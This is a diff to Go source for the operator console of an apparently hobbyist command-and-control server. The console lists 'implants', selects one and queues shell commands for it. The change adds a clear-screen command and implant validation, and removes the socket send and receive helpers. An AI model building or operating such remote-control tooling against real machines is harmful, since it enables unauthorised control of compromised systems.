@@ -4,12 +4,10 @@ import (
 	"bufio"
 	"fmt"
 	"log"
-	"net"
 	"os"
 	"strings"
 )
 
-var pendingCommand string
 var outputDone = make(chan bool)
 var selectedImplant string
 
@@ -19,7 +17,7 @@ func helpMenu() {
 }
 
 func listImplants() {
-	for _, implant := range implants {
+	for _, implant := range implants { //iterates all through the map giving value for each one
 		status := "inactive"
 		if implant.Active {
 			status = "Active"
@@ -29,6 +27,7 @@ func listImplants() {
 	}
 
 }
+
 func getUserInput() {
 	input := bufio.NewReader(os.Stdin)
 
@@ -46,50 +45,37 @@ func getUserInput() {
 			continue
 		}
 
+		if command == "clear" || command == "CLEAR" {
+			fmt.Print("\033[H\033[2J") //Clear screen
+			continue
+		}
+
 		command = strings.TrimSpace(command)
-		if command == "/implants" {
+		if command == "implants" {
 			listImplants()
 			continue
 		}
 
 		if strings.HasPrefix(command, "use ") {
 			selectedImplant = strings.TrimPrefix(command, "use ")
-			fmt.Println("[*] Selected: ", selectedImplant)
+			if implants[selectedImplant] == nil {
+				fmt.Println("[-] Implant does not exist")
+				selectedImplant = ""
+			} else {
+				fmt.Println("[*] Selected:", selectedImplant)
+			}
 			continue
 		}
-
 		if selectedImplant == "" {
 			fmt.Println("[!] No implant selected")
 			continue
 		}
-
+		if implants[selectedImplant] == nil || !implants[selectedImplant].Active {
+			fmt.Println("[-] Implant no longer active")
+			selectedImplant = ""
+			continue
+		}
 		implants[selectedImplant].Command = command
-		<-outputDone // Receving a value from channel i believe
-	}
-}
-
-func sendCommands(conn net.Conn, command string) {
-
-	_, err := conn.Write([]byte(command))
-	if err != nil {
-		log.Println("[-] Error sending command", err)
-		return
-	}
-
-	fmt.Println("\n[+] Command sent successfully")
-}
-
-func receiveOutput(reader *bufio.Reader) {
-	response := bufio.NewReader(reader)
-	for {
-		output, err := response.ReadString('\n')
-		if err != nil {
-			return
-		}
-		if strings.TrimSpace(output) == "END_OF_OUTPUT" {
-			outputDone <- true
-			return
-		}
-		fmt.Print(output)
+		<-outputDone
 	}
 }
